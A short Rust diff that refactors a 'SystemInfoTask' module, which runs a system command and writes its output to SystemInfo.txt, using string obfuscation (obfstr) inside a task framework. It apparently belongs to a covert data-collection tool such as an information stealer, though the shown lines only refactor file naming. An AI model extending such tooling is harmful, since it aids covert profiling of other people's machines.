@@ -1,11 +1,14 @@
+use crate::alloc::borrow::ToOwned;
 use alloc::string::String;
-use tasks::Task;
+use tasks::{parent_name, Task};
 use utils::path::{Path, WriteToFile};
 use utils::process;
 use obfstr::obfstr as s;
 pub(super) struct SystemInfoTask;
 
 impl Task for SystemInfoTask {
+    parent_name!("SystemInfo.txt");
+    
     unsafe fn run(&self, parent: &Path) {
         let system = Path::system();
         
@@ -18,7 +21,6 @@ impl Task for SystemInfoTask {
         let res = String::from_utf8_lossy(&res);
         let res = res.trim();
         
-        let output_path = parent / s!("SystemInfo.txt");
-        let _ = res.write_to(&output_path);
+        let _ = res.write_to(parent);
     }
 }
